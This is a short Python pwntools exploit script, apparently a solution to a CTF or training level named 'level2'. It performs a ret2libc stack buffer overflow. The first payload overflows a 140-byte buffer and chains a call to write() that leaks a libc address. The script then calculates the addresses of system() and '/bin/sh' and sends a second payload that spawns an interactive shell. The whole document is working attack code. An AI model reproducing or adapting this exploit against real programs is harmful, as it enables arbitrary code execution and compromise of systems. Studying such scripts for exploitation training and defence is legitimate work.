#!/usr/bin/env python

from pwn import *

libc = ELF('../lib/libc.so.6')
elf = ELF('../bin/level2')

p = process('../bin/level2')

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)

got_write = elf.got['write']
print 'got_write= ' + hex(got_write)

vulfun_addr = 0x804844d
print 'vulfun_addr' + hex(vulfun_addr)

payload1 = 'A'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(got_write) + p32(4)

print "\n###sending payload1 ...###"
p.send(payload1)

print "\n###receving write() addr ...###"
write_addr = u32(p.recv(4))

print 'write_addr= ' + hex(write_addr)

print "\n###calculating system() addr and \"/bin/sh\" addr ...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)

binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)

payload2 = 'A'*140 + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

print '\n###sending payload2 ...###'
p.send(payload2)

p.interactive()

